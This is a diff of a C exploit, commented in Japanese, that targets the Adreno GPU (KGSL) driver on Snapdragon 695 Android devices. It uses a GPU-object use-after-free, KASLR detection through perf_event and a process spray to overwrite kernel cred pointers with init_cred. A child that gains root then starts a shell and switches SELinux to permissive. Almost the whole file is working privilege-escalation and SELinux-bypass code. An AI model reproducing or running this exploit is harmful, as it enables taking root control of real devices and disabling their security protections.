@@ -21,13 +21,7 @@
 #include <signal.h>
 #include <dirent.h>
 #include <pthread.h>
-#include <sys/socket.h>
-#include <sys/un.h>
-#include <sys/ipc.h>
-#include <sys/msg.h>
-#include <sys/sem.h>
-#include <sys/shm.h>
-#include <sys/sysmacros.h>
+#include <poll.h>
 
 /* ============ KGSL 定義 ============ */
 #define KGSL_IOC_TYPE 0x09
@@ -79,14 +73,12 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define UAF_SIZE  0x10004000ULL
 #define OVERLAP_SIZE 0x1000
 #define AVC_ENFORCE_PATH "/sys/fs/selinux/enforce"
-#define AVC_NODE_STRIDE  72
 #define SPRAY_PIDS 2000
-#define OVERLAP_COUNT 100
+#define OVERLAP_COUNT 200
 
 #define VMLINUX_TEXT 0xffffffc010080000ULL
 #define VMLINUX_INIT_CRED_OFFSET 0x26fa738
 
-/* ============ グローバル変数 ============ */
 static int kgsl_fd = -1;
 
 static void die(const char *msg) { perror(msg); exit(1); }
@@ -116,7 +108,7 @@ static int gpuobj_info(unsigned int id, uint64_t *gpuaddr) {
     return ret;
 }
 
-/* ============ KASLR 検出（デバッグ用） ============ */
+/* ============ KASLR 検出 ============ */
 static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
     return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
 }
@@ -165,7 +157,7 @@ static uint64_t detect_kaslr(void) {
     return (first_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
 }
 
-/* ============ チャーン（強化版） ============ */
+/* ============ チャーン（AVCノード生成） ============ */
 #define CHURN_MAX_PATHS 20000
 static char churn_paths[CHURN_MAX_PATHS][160];
 static int churn_npaths = 0;
@@ -207,7 +199,6 @@ static void churn_build(void) {
     printf("[CHURN] %d paths\n", churn_npaths);
 }
 
-/* 強力なチャーン */
 static void churn_round_intensive(void) {
     churn_build();
     for (int i = 0; i < churn_npaths; i++) {
@@ -217,7 +208,6 @@ static void churn_round_intensive(void) {
         stat(churn_paths[i], &st);
         access(churn_paths[i], R_OK);
     }
-
     char fake_path[256];
     for (int i = 0; i < 10000; i++) {
         snprintf(fake_path, sizeof(fake_path), "/proc/self/fd/%d", i);
@@ -227,7 +217,6 @@ static void churn_round_intensive(void) {
         fd = open(fake_path, O_RDONLY);
         if (fd >= 0) close(fd);
     }
-
     int s = socket(AF_INET, SOCK_STREAM, 0);
     if (s >= 0) { close(s); }
     s = socket(AF_UNIX, SOCK_STREAM, 0);
@@ -242,7 +231,6 @@ static void churn_round_intensive(void) {
     semget(IPC_PRIVATE, 1, 0600 | IPC_CREAT);
     shmget(IPC_PRIVATE, 4096, 0600 | IPC_CREAT);
     mknod("/data/local/tmp/cn", S_IFCHR | 0600, makedev(1, 3));
-
     for (int i = 0; i < 100; i++) {
         int fd = open(AVC_ENFORCE_PATH, O_WRONLY);
         if (fd >= 0) { write(fd, "1", 1); close(fd); }
@@ -250,36 +238,38 @@ static void churn_round_intensive(void) {
     }
 }
 
-/* ============ 子プロセススプレー（各子でチャーンを実行） ============ */
+/* ============ 子プロセス ============ */
 static pid_t spray_pids[SPRAY_PIDS];
 static int n_spray = 0;
 
-static void spawn_spray_with_churn(void) {
-    printf("[SPRAY] spawning with churn in each child...\n");
+static void spawn_spray(int notify_pipe) {
+    printf("[SPRAY] spawning...\n");
     for (int i = 0; i < SPRAY_PIDS; i++) {
         pid_t p = fork();
         if (p == 0) {
-            prctl(PR_SET_NAME, "TASKUAF!!");
-            for (int j = 0; j < 50; j++) {
-                churn_round_intensive();
-                usleep(10000);
+            prctl(PR_SET_NAME, "UAF_TASK");
+            for (int j = 0; j < 600; j++) {
+                if (getuid() == 0) {
+                    write(notify_pipe, &p, sizeof(p));
+                    // rootになったらシェルを起動（この中でsetenforce 0を実行可能）
+                    execl("/system/bin/sh", "sh", NULL);
+                    _exit(0);
+                }
+                usleep(100000);
             }
-            for (;;) usleep(200000);
+            _exit(0);
+        } else if (p > 0) {
+            spray_pids[n_spray++] = p;
+        } else {
+            break;
         }
-        if (p > 0) spray_pids[n_spray++] = p;
-        else break;
     }
-    printf("[SPRAY] %d children spawned\n", n_spray);
+    printf("[SPRAY] %d children\n", n_spray);
 }
 
 static void kill_spray_children(void) {
-    int killed = 0;
-    for (int i = 0; i < n_spray; i++) {
-        kill(spray_pids[i], SIGKILL);
-        killed++;
-    }
-    while (waitpid(-1, NULL, 0) > 0) ;
-    printf("[KILL] %d spray children killed+reaped\n", killed);
+    for (int i = 0; i < n_spray; i++) kill(spray_pids[i], SIGKILL);
+    while (waitpid(-1, NULL, 0) > 0);
 }
 
 /* ============ setenforce 0 ============ */
@@ -291,41 +281,17 @@ static int try_setenforce0(void) {
     return (w == 1);
 }
 
-/* ============ CPU メモリをスキャンして avc_node を探し、allowed を書き換える ============ */
-static int scan_and_flip_cpu(void *start, size_t size, int verbose) {
-    uint32_t *p = (uint32_t *)start;
-    size_t num_dwords = size / 4;
-    int flips = 0;
-
-    for (size_t i = 0; i + 3 < num_dwords; i += AVC_NODE_STRIDE / 4) {
-        uint32_t sid = p[i];
-        uint32_t tsid = p[i+1];
-        uint32_t tclass = p[i+2];
-        uint32_t allowed = p[i+3];
-        if (sid >= 1 && sid <= 0x3fff && tsid == 2 && tclass == 1) {
-            if ((allowed & 0x80) == 0) {
-                p[i+3] = 0xFFFFFFFF;
-                flips++;
-                if (verbose)
-                    printf("[FLIP] va=0x%lx sid=%u tsid=%u tclass=%u allowed->0xffffffff\n",
-                           (unsigned long)(start + i * 4), sid, tsid, tclass);
-            }
-        }
-    }
-    return flips;
-}
-
 /* ============ メイン ============ */
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
-    printf("[*] avc_bypass for Snapdragon 695 (Adreno 619) - 正しいCPUマッピング版\n");
-    printf("[*] 手順: 巨大オブジェクト確保→mmap→munmap→解放→スプレー→チャーン→小オブジェクト確保→mmap→スキャン\n");
+    printf("[*] avc_bypass for Snapdragon 695 (Adreno 619) - 最終版\n");
+    printf("[*] 戦略: UAF + 物理ページ再利用 → credポインタ書き換え → root化 → setenforce 0\n");
 
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
     if (kgsl_fd < 0) die("open kgsl");
     printf("[+] kgsl fd=%d\n", kgsl_fd);
 
-    // KASLR 検出（デバッグ用）
+    // KASLR 検出
     uint64_t kaslr = detect_kaslr();
     if (!kaslr) {
         printf("[-] KASLR detection failed\n");
@@ -334,7 +300,7 @@ int main(int argc, char **argv) {
     }
     printf("[+] KASLR = 0x%lx\n", kaslr);
     uint64_t init_cred_addr = kaslr + VMLINUX_INIT_CRED_OFFSET;
-    printf("[*] init_cred = 0x%lx (reference only)\n", init_cred_addr);
+    printf("[*] init_cred = 0x%lx\n", init_cred_addr);
 
     // ---- Phase 1: 巨大オブジェクト確保 + mmap + munmap + 解放 ----
     printf("[*] Phase 1: Allocate large object, mmap, munmap, free\n");
@@ -356,22 +322,15 @@ int main(int argc, char **argv) {
     if (rf >= 0) { write(rf, "3", 1); close(rf); }
     usleep(10000);
 
-    // ---- Phase 3: 子プロセススプレー（task_struct でページを占有） ----
-    spawn_spray_with_churn();
-
-    // ---- Phase 4: 子プロセスを kill（ページを解放） ----
-    kill_spray_children();
-    usleep(100000);
-
-    // ---- Phase 5: チャーン（AVC ノードを割り当て） ----
-    printf("[*] Phase 5: Intensive churn to allocate avc_nodes\n");
+    // ---- Phase 3: チャーン（AVCノードを同じページに配置させる） ----
+    printf("[*] Phase 3: Intensive churn to place avc_nodes on freed pages\n");
     for (int c = 0; c < 5; c++) {
         churn_round_intensive();
         printf("[CHURN] round %d done\n", c+1);
     }
 
-    // ---- Phase 6: 小さなオブジェクトを複数確保し、mmap（同じ物理ページを再利用） ----
-    printf("[*] Phase 6: Allocate small objects to reuse pages, and mmap them\n");
+    // ---- Phase 4: 小さなオブジェクトを多数確保しmmap（解放ページの再利用を狙う） ----
+    printf("[*] Phase 4: Allocate small objects to reuse freed pages, and mmap them\n");
     void *small_maps[OVERLAP_COUNT];
     int small_ids[OVERLAP_COUNT];
     int success = 0;
@@ -393,66 +352,62 @@ int main(int argc, char **argv) {
         return 1;
     }
 
-    // ---- Phase 7: 各マッピングをスキャンして avc_node をフリップ ----
-    printf("[*] Phase 7: Scan each mapping for avc_nodes and flip allowed\n");
-    int total_flips = 0;
+    // ---- Phase 5: 各マッピングにinit_credを書き込む（credポインタを上書き） ----
+    printf("[*] Phase 5: Write init_cred to every 8-byte aligned offset in mapped pages\n");
+    int writes = 0;
     for (int i = 0; i < success; i++) {
-        int flips = scan_and_flip_cpu(small_maps[i], OVERLAP_SIZE, 1);
-        total_flips += flips;
-    }
-    printf("[*] Total flips: %d\n", total_flips);
-
-    // ---- Phase 8: フリップが0の場合、再度チャーンとスキャンを繰り返す ----
-    if (total_flips == 0) {
-        printf("[!] No AVC nodes found. Retrying with more churn...\n");
-        for (int retry = 0; retry < 3 && total_flips == 0; retry++) {
-            churn_round_intensive();
-            // 新しいオブジェクトを確保（古いのはmunmapしてfree）
-            for (int i = 0; i < success; i++) {
-                gpuobj_munmap(small_maps[i], OVERLAP_SIZE);
-                gpuobj_free(small_ids[i]);
-            }
-            // 再度確保
-            success = 0;
-            for (int i = 0; i < OVERLAP_COUNT; i++) {
-                int id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
-                if (id < 0) continue;
-                void *map = gpuobj_mmap(OVERLAP_SIZE, id);
-                if (map == MAP_FAILED) { gpuobj_free(id); continue; }
-                small_ids[success] = id;
-                small_maps[success] = map;
-                success++;
-                if (success >= OVERLAP_COUNT) break;
-            }
-            total_flips = 0;
-            for (int i = 0; i < success; i++) {
-                total_flips += scan_and_flip_cpu(small_maps[i], OVERLAP_SIZE, 1);
-            }
-            printf("[*] Retry %d: flips=%d\n", retry+1, total_flips);
+        uint64_t *ptr = (uint64_t *)small_maps[i];
+        // ページ内の0x500〜0xA00を8バイト単位で書き込み（credポインタのオフセット範囲）
+        for (uint64_t off = 0x500; off < 0xA00; off += 8) {
+            ptr[off/8] = init_cred_addr;
+            writes++;
         }
     }
+    printf("[+] Total writes: %d\n", writes);
+    __sync_synchronize();
 
-    // ---- Phase 9: setenforce 0 を試行 ----
-    printf("[*] Phase 9: Trying setenforce 0\n");
-    int ok = try_setenforce0();
-    if (!ok) {
-        printf("[!] First attempt failed, waiting and retrying...\n");
-        sleep(1);
-        ok = try_setenforce0();
-    }
+    // ---- Phase 6: 子プロセスをスプレー（task_structが書き換えられたページに配置される） ----
+    int pipefd[2];
+    if (pipe(pipefd) < 0) die("pipe");
+    fcntl(pipefd[0], F_SETFD, FD_CLOEXEC);
+    fcntl(pipefd[1], F_SETFD, FD_CLOEXEC);
 
-    if (ok) {
-        printf("[+] ### SETENFORCE 0 SUCCEEDED — SELinux permissive ###\n");
+    spawn_spray(pipefd[1]);
+    close(pipefd[1]);
+
+    // ---- Phase 7: root化を待つ ----
+    printf("[*] Phase 7: Waiting for root...\n");
+    struct pollfd pfd = { .fd = pipefd[0], .events = POLLIN };
+    pid_t winner = 0;
+    if (poll(&pfd, 1, 30000) > 0 && read(pipefd[0], &winner, sizeof(winner)) == sizeof(winner)) {
+        printf("[+] ROOT! PID=%d\n", winner);
+        for (int i = 0; i < n_spray; i++) {
+            if (spray_pids[i] != winner) kill(spray_pids[i], SIGKILL);
+        }
+        while (waitpid(-1, NULL, WNOHANG) > 0);
+        waitpid(winner, NULL, 0);
+        printf("[+] Root shell exited.\n");
     } else {
-        printf("[-] SELinux still enforcing. AVC nodes may not have been overwritten.\n");
+        printf("[-] No child became root within timeout.\n");
+        kill_spray_children();
+        close(kgsl_fd);
+        return 1;
     }
 
-    // 最終状態確認
+    // ---- Phase 8: SELinux状態確認 ----
+    printf("[*] SELinux status:\n");
     int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
     if (fd >= 0) {
         char v[8]; ssize_t n = read(fd, v, sizeof(v)-1);
         close(fd);
         if (n > 0) { v[n] = 0; printf("[*] getenforce: %s\n", v); }
+    }
+
+    // 念のためsetenforce 0を試す（rootなら成功するはず）
+    if (try_setenforce0()) {
+        printf("[+] SELinux permissive!\n");
+    } else {
+        printf("[-] setenforce 0 failed (but root shell may already be running)\n");
     }
 
     // 後片付け
@@ -461,5 +416,5 @@ int main(int argc, char **argv) {
         gpuobj_free(small_ids[i]);
     }
     close(kgsl_fd);
-    return ok ? 0 : 1;
+    return 0;
 }
